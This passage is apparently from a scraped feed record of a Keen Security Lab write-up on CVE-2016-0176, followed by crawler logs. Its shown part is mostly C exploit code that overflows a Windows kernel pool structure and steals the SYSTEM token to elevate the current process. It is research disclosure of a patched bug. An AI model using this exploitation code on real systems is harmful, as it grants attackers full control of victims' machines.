/></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n   <td class=\"code\"><pre><span class=\"line\"><span class=\"function\">VOID <span class=\"title\">ThPresent</span><span class=\"params\">(THREAD_HOST * th)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\">    SIZE_T hint = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (TRUE)</span><br><span class=\"line\">    {</span><br><span class=\"line\"> HIST_TOKEN ht = { <span class=\"number\">0</span>, };</span><br><span class=\"line\"> HtInitialize(&amp;ht);</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T victim_surf_obj = ThNextGuessedAddr(th, ++hint);</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T buffer_ptr = victim_surf_obj + <span class=\"number\">0x200000</span> + <span class=\"number\">0x18</span>;</span><br><span class=\"line\"> th-&gt;backupBufferPtr1 = victim_surf_obj + <span class=\"number\">0x258</span>;</span><br><span class=\"line\"> th-&gt;backupBufferPtr2 = victim_surf_obj + <span class=\"number\">0x200000</span> + <span class=\"number\">0x258</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T back_offset = <span class=\"number\">0x10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> SURFOBJ surf_obj = { <span class=\"number\">0</span>, };</span><br><span class=\"line\"></span><br><span class=\"line\"> surf_obj.cjBits = <span class=\"number\">0x80</span>;</span><br><span class=\"line\"> surf_obj.pvBits = (PVOID)buffer_ptr;</span><br><span class=\"line\"> surf_obj.pvScan0 = (PVOID)buffer_ptr;</span><br><span class=\"line\"> surf_obj.sizlBitmap.cx = <span class=\"number\">0x04</span>;</span><br><span class=\"line\"> surf_obj.sizlBitmap.cy = <span class=\"number\">0x08</span>;</span><br><span class=\"line\"> surf_obj.iBitmapFormat = <span class=\"number\">0x06</span>;</span><br><span class=\"line\"> surf_obj.iType = <span class=\"number\">0</span>;</span><br><span class=\"line\"> surf_obj.fjBitmap = <span class=\"number\">0x01</span>;</span><br><span class=\"line\"> surf_obj.lDelta = <span class=\"number\">0x10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> DWORD dwBuff = <span class=\"number\">0x04800200</span>;</span><br><span class=\"line\"> HtSetBuffer(&amp;ht, <span class=\"number\">0x18</span> + th-&gt;memberOffset - back_offset, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span>*)&amp;surf_obj, <span class=\"number\">0x68</span>);</span><br><span class=\"line\"> HtSetBuffer(&amp;ht, <span class=\"number\">0x70</span> + th-&gt;memberOffset - back_offset, &amp;dwBuff, <span class=\"keyword\">sizeof</span>(DWORD));</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">if</span> (th-&gt;memberOffset - back_offset + <span class=\"number\">0xE8</span> &lt; <span class=\"number\">0x448</span>)</span><br><span class=\"line\"> {</span><br><span class=\"line\"> SIZE_T qwBuff = victim_surf_obj + <span class=\"number\">0xE0</span>;</span><br><span class=\"line\"> HtSetBuffer(&amp;ht, <span class=\"number\">0xE0</span> + th-&gt;memberOffset - back_offset, &amp;qwBuff, <span class=\"keyword\">sizeof</span>(SIZE_T));</span><br><span class=\"line\"> HtSetBuffer(&amp;ht, <span class=\"number\">0xE8</span> + th-&gt;memberOffset - back_offset, &amp;qwBuff, <span class=\"keyword\">sizeof</span>(SIZE_T));</span><br><span class=\"line\"> }</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">if</span> (th-&gt;memberOffset - back_offset + <span class=\"number\">0x1C0</span> &lt; <span class=\"number\">0x448</span>)</span><br><span class=\"line\"> {</span><br><span class=\"line\"> SIZE_T qwBuff = victim_surf_obj + <span class=\"number\">0x1B8</span>;</span><br><span class=\"line\"> HtSetBuffer(&amp;ht, <span class=\"number\">0x1B8</span> + th-&gt;memberOffset - back_offset, &amp;qwBuff, <span class=\"keyword\">sizeof</span>(SIZE_T));</span><br><span class=\"line\"> HtSetBuffer(&amp;ht, <span class=\"number\">0x1C0</span> + th-&gt;memberOffset - back_offset, &amp;qwBuff, <span class=\"keyword\">sizeof</span>(SIZE_T));</span><br><span class=\"line\"> }</span><br><span class=\"line\"></span><br><span class=\"line\"> HtOverflowNextSListEntry(&amp;ht, victim_surf_obj);</span><br><span class=\"line\"> HtTrigger(&amp;ht);</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">if</span> (th-&gt;triggered)</span><br><span class=\"line\"> <span class=\"keyword\">break</span>;</span><br><span class=\"line\"> }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">VOID <span class=\"title\">ThTrigger</span><span class=\"params\">(THREAD_HOST * th)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\"> SIZE_T i = <span class=\"number\">0</span>;</span><br><span class=\"line\"> HANDLE threads[TH_MAX_THREADS] = { <span class=\"number\">0</span>, };</span><br><span class=\"line\"> <span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> second_buffer[<span class=\"number\">0x78</span>] = { <span class=\"number\">0</span>, };</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">for</span> (SIZE_T i = <span class=\"number\">0</span>; i &lt; TH_MAX_THREADS; i++)</span><br><span class=\"line\"> {</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (th-&gt;triggered)</span><br><span class=\"line\"> {</span><br><span class=\"line\"> <span class=\"keyword\">break</span>;</span><br><span class=\"line\"> }</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">if</span> (i == <span class=\"number\">9</span>)</span><br><span class=\"line\"> {</span><br><span class=\"line\"> DWORD thread_id = <span class=\"number\">0</span>;</span><br><span class=\"line\"> threads[i] = CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ProbeThreadProc, th, <span class=\"number\">0</span>, &amp;thread_id);</span><br><span class=\"line\"> }</span><br><span class=\"line\"> <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (i % <span class=\"number\">3</span> != <span class=\"number\">0</span> &amp;&amp; i &gt; <span class=\"number\">0x10</span>)</span><br><span class=\"line\"> {</span><br><span class=\"line\"> DWORD thread_id = <span class=\"number\">0</span>;</span><br><span class=\"line\"> threads[i] = CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, PresentThreadProc, th, <span class=\"number\">0</span>, &amp;thread_id);</span><br><span class=\"line\"> } </span><br><span class=\"line\"> <span class=\"keyword\">else</span></span><br><span class=\"line\"> {</span><br><span class=\"line\"> DWORD thread_id = <span class=\"number\">0</span>;</span><br><span class=\"line\"> threads[i] = CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, BitbltThreadProc, th, <span class=\"number\">0</span>, &amp;thread_id);</span><br><span class=\"line\"> }</span><br><span class=\"line\"> }</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; TH_MAX_THREADS; i++)</span><br><span class=\"line\"> {</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (threads[i] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\"> {</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (WAIT_OBJECT_0 == WaitForSingleObject(threads[i], INFINITE))</span><br><span class=\"line\"> {</span><br><span class=\"line\"> CloseHandle(threads[i]);</span><br><span class=\"line\"> threads[i] = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"> }</span><br><span class=\"line\"> }</span><br><span class=\"line\"> }</span><br><span class=\"line\"></span><br><span class=\"line\"> Log(<span class=\"string\">\"trigged\\n\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> ThRead(th, (<span class=\"keyword\">const</span> <span class=\"keyword\">void</span>*)th-&gt;backupBufferPtr2, second_buffer, <span class=\"number\">0x78</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> ADDR_RESOLVER ar = { <span class=\"number\">0</span>, };</span><br><span class=\"line\"> ArInitialize(&amp;ar, th);</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T nt_addr = ArNTBase(&amp;ar); </span><br><span class=\"line\"> SIZE_T psp_cid_table_addr = nt_addr + PSP_CIDTABLE_OFFSET;</span><br><span class=\"line\"> SIZE_T psp_cid_table_value;</span><br><span class=\"line\"></span><br><span class=\"line\"> ThRead(th, psp_cid_table_addr, &amp;psp_cid_table_value, <span class=\"number\">0x08</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T psp_cid_table[<span class=\"number\">0x0C</span>] = { <span class=\"number\">0</span>, };</span><br><span class=\"line\"> ThRead(th, psp_cid_table_value, psp_cid_table, <span class=\"number\">0x60</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T table_code = psp_cid_table[<span class=\"number\">1</span>];</span><br><span class=\"line\"> SIZE_T handle_count = psp_cid_table[<span class=\"number\">0x0B</span>] &amp; <span class=\"number\">0x00000000ffffffff</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T curr_pid = GetCurrentProcessId();</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">do</span></span><br><span class=\"line\"> {</span><br><span class=\"line\"> ThParseCidTable(th, table_code, handle_count);</span><br><span class=\"line\"> Sleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\"> } <span class=\"keyword\">while</span> (th-&gt;currentEprocess == <span class=\"literal\">NULL</span> || th-&gt;systemEprocess == <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T curr_proc = th-&gt;currentEprocess;</span><br><span class=\"line\"> SIZE_T system_proc = th-&gt;systemEprocess;</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T system_token = <span class=\"number\">0</span>;</span><br><span class=\"line\"> ThRead(th, (system_proc + <span class=\"number\">0x358</span>), &amp;system_token, <span class=\"number\">0x08</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> SIZE_T curr_token = <span class=\"number\">0</span>;</span><br><span class=\"line\"> ThRead(th, (curr_proc + <span class=\"number\">0x358</span>), &amp;curr_token, <span class=\"number\">0x08</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> ThWrite(th, (curr_proc + <span class=\"number\">0x358</span>), &amp;system_token, <span class=\"number\">0x08</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> ThRead(th, (curr_proc + <span class=\"number\">0x358</span>), &amp;curr_token, <span class=\"number\">0x08</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\"> ThRestore(th);</span><br><span class=\"line\"></span><br><span class=\"line\"> Log(<span class=\"string\">\"elevated\\n\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> Sleep(<span class=\"number\">3600000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">return</span>;</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<h3 id=\"References\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#References\" class=\"headerlink\" title=\"References:\"></a>References:</h3> \n<ol> \n <li><a href=\"https://ruxcon.org.au/assets/2016/slides/Rainbow_over_the_Windows.pdf\" target=\"_blank\" rel=\"noopener\">Rainbow Over the Windows</a></li> \n <li><a href=\"https://github.com/long123king/tokenext/blob/master/doc/Did_You_Get_Your_Token.pdf\" target=\"_blank\" rel=\"noopener\">Did You Get Your Token?</a></li> \n <li><a href=\"http://www.slideshare.net/PeterHlavaty/windows-kernel-exploitation-this-time-font-hunt-you-down-in-4-bytes\" target=\"_blank\" rel=\"noopener\">Windows Kernel Exploitation : This Time Font hunt you down in 4 bytes</a></li> \n <li><a href=\"https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf\" target=\"_blank\" rel=\"noopener\">Kernel Pool Exploitation on Windows 7</a></li> \n</ol>","descriptionType":"html","publishedDate":"Fri, 18 Nov 2016 07:29:39 +0000","feedId":17218,"bgimg":"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_1.svg","linkMd5":"b053f98b0900f3e9efc44e1aa86f6b4f","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn50@2020_4/2020/10/16/17-21-21-185_74ef499039d78fba.svg","destWidth":0,"destHeight":0,"sourceBytes":36842,"destBytes":36842,"author":"","articleImgCdnMap":{"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_1.svg":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn50@2020_4/2020/10/16/17-21-21-185_74ef499039d78fba.svg","http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_2.svg":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn90@2020_4/2020/10/16/17-21-25-445_2167b6571f1903cf.svg","http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_3.svg":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn93@2020_2/2020/10/16/17-21-26-381_a646363345943806.svg","http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_4.svg":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn82@2020_4/2020/10/16/17-21-25-428_770f91441fbc9828.svg","http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_5.svg":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn77@2020_6/2020/10/16/17-21-26-614_6fcbc080c06b08ee.svg","http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_6.svg":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn86@2020_1/2020/10/16/17-21-25-487_93846d9d3514533b.svg","http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_7.svg":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn57@2020_2/2020/10/16/17-21-25-929_3682d1936495cfc0.svg","http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_9.svg":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn54@2020_5/2020/10/16/17-21-25-467_1cc8e1c4e8adc989.svg","http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_10.svg":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn66@2020_3/2020/10/16/17-21-25-594_95d012d3a569d900.svg","http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_11.svg":null,"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_12.svg":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn73@2020_2/2020/10/16/17-21-25-366_7e63c256ceed1b96.svg","http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_13.svg":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn61@2020_6/2020/10/16/17-21-25-061_c093aad51ad449e4.svg"},"publishedOrCreatedDate":1602868870157}],"record":{"createdTime":"2020-10-17 01:21:10","updatedTime":"2020-10-17 01:21:10","feedId":17218,"fetchDate":"Fri, 16 Oct 2020 17:21:10 +0000","fetchMs":3167,"handleMs":5608,"totalMs":28302,"newArticles":0,"totalArticles":19,"status":1,"type":0,"ip":"521d8df089fc67e35add3163b58b477a","hostName":"us-030*","requestId":"5e7a887eaab743878c7d85b54e72254e_17218","contentType":"text/xml; charset=utf8","totalBytes":285945,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":12,"articlesImgsGithubTotal":11,"successGithubMap":{"myreaderx25":1,"myreaderx8":1,"myreaderx16":1,"myreaderx10":1,"myreaderx21":1,"myreaderx32":1,"myreaderx11":1,"myreaderx13":1,"myreaderx30":1,"myreaderx31":1,"myreaderx19":1},"failGithubMap":{"myreaderx23":1}},"feed":{"createdTime":"2020-09-07 02:14:36","updatedTime":"2020-09-07 02:47:46","id":17218,"name":"Keen Security Lab Blog","url":"http://keenlab.tencent.com/en/atom.xml","subscriber":194,"website":null,"icon":"http://keenlab.tencent.com/favicon.ico","icon_jsdelivr":null,"description":"","weekly":null,"link":"http://keenlab.tencent.com"},"noPictureArticleList":[{"createdTime":"2020-10-17 01:21:28","updatedTime":"2020-10-17 01:21:28","id":null,"feedId":17218,"linkMd5":"b053f98b0900f3e9efc44e1aa86f6b4f"}],"tmpCommonImgCdnBytes":36842,"tmpBodyImgCdnBytes":249103,"tmpBgImgCdnBytes":0,"extra4":{"start":1602868859822,"total":0,"statList":[{"spend":4729,"msg":"获取xml内容"},{"spend":5608,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":6075,"msg":"正文链接上传到cdn"}]},"extra5":12,"extra6":12,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_11.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"sourceBytes":24394,"destBytes":24394,"feedId":17218,"totalSpendMs":3927,"convertSpendMs":0,"createdTime":"2020-10-17 01:21:22","host":"us-029*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn69/contents/2020/10/16/17-21-25-902_c742647841860042.svg","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Fri, 16 Oct 2020 17:21:26 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["A1E0:592E:59CAE6F:957AEA5:5F89D695"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1602870262"],"x-ratelimit-used":["62"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn69/contents/2020/10/16/17-21-25-902_c742647841860042.svg","historyStatusCode":[],"spendMs":110},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"23.8 KB","destSize":"23.8 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_11.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"sourceBytes":24394,"destBytes":24394,"feedId":17218,"totalSpendMs":2100,"convertSpendMs":0,"createdTime":"2020-10-17 01:21:26","host":"us-029*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn69/contents/2020/10/16/17-21-28-072_c742647841860042.svg","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Fri, 16 Oct 2020 17:21:28 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["CF28:2DBC:E43FC1:21FFC74:5F89D696"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1602870262"],"x-ratelimit-used":["62"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn69/contents/2020/10/16/17-21-28-072_c742647841860042.svg","historyStatusCode":[],"spendMs":47},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"23.8 KB","destSize":"23.8 KB","compressRate":"100%"}],"extra10_invalidATagHrefValue":{"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#Exploitation":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#Exploitation","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#2nd-Try-Loop-calling-D3DKMTPresent-with-overflowing-fields-set-in-the-buffer-from-multiple-threads":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#2nd-Try-Loop-calling-D3DKMTPresent-with-overflowing-fields-set-in-the-buffer-from-multiple-threads","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#3rd-and-Last-Try-Loop-calling-D3DKMTPresent-with-overflowing-fields-set-in-the-buffer-from-multiple-threads-while-loop-calling-BitBlt-from-another-multiple-threads":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#3rd-and-Last-Try-Loop-calling-D3DKMTPresent-with-overflowing-fields-set-in-the-buffer-from-multiple-threads-while-loop-calling-BitBlt-from-another-multiple-threads","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#Repeatable-arbitrary-read-and-write-into-kernel-mode-memory":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#Repeatable-arbitrary-read-and-write-into-kernel-mode-memory","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#References":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#References","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#Idea-1-Overflow-the-buffer-after-0x2290-offset-where-maybe-reused-by-some-small-allocations-from-paged-pool":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#Idea-1-Overflow-the-buffer-after-0x2290-offset-where-maybe-reused-by-some-small-allocations-from-paged-pool","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#CVE-2016-0176":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#CVE-2016-0176","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#Idea-2-Overflow-the-adjacent-history-token’s-header-which-may-abuse-the-singly-linked-list":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#Idea-2-Overflow-the-adjacent-history-token’s-header-which-may-abuse-the-singly-linked-list","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#Some-More-Tricks":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#Some-More-Tricks","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#Exploitation-Code-parts":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#Exploitation-Code-parts","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#1st-Try-Loop-calling-D3DKMTPresent-with-overflowing-fields-set-in-the-buffer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#1st-Try-Loop-calling-D3DKMTPresent-with-overflowing-fields-set-in-the-buffer","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#A-Detailed-Description-of-CVE-2016-0176-and-Its-Exploitation":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#A-Detailed-Description-of-CVE-2016-0176-and-Its-Exploitation","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#Essentials-of-a-Successful-Pwn-of-Microsoft-Edge":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#Essentials-of-a-Successful-Pwn-of-Microsoft-Edge","http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/_#Token-Stealing":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#Token-Stealing"},"extra111_proxyServerAndStatMap":{"http://us-013.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-56.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-001.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe68.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-017.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-021.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe64.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-034.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-005.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-52.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-029.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_1.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn50@2020_4/2020/10/16/17-21-21-185_74ef499039d78fba.svg","sourceBytes":36842,"destBytes":36842,"feedId":17218,"totalSpendMs":4917,"convertSpendMs":0,"createdTime":"2020-10-17 01:21:17","host":"us-025*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f,b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"36 KB","destSize":"36 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/A-Link-To-System-Privilege/edge_eop_img_13.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn61@2020_6/2020/10/16/17-21-25-061_c093aad51ad449e4.svg","sourceBytes":24902,"destBytes":24902,"feedId":17218,"totalSpendMs":3945,"convertSpendMs":0,"createdTime":"2020-10-17 01:21:22","host":"europe64*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.3 KB","destSize":"24.3 